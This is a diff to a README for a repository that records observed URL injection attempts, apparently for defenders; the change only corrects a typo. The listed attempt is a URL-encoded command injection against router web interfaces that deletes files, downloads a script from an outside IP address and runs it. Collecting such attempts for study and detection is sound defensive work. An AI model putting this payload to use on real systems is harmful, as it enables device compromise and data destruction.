@@ -1,7 +1,7 @@
 # h@ck-attempts - 2024
 URL injecting attempts to watch out for...
 - I do not support these actions. This is used for studying and observing.
-- User the ```file-on-server.html``` to determine if you have these files on your server.
+- Use the ```file-on-server.html``` to determine if you have these files on your server.
 ## ATTEMPTS:
 ```
 1. ../cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh)
